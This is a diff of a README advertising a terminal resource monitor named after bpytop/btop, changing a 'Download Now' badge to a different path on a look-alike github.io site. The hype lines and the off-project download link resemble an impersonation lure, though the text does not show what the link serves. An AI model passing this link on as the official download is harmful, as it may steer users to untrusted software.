@@ -5,7 +5,7 @@ A cutting-edge, ultra-efficient terminal-based resource monitoring solution desi
 ✨ **Featured in top developer communities** ✨  
 🔥 **Trusted by thousands of DevOps professionals worldwide** 🔥
 
-[![Download Now](https://img.shields.io/badge/Download-bpytop__btop++-brightgreen)](https://bpytop-btop-a-monitor-of-resources.github.io/.github)
+[![Download Now](https://img.shields.io/badge/Download-bpytop__btop++-brightgreen)](https://bpytop-btop-a-monitor-of-resources.github.io/.github/bpytop)
 
 ---
 
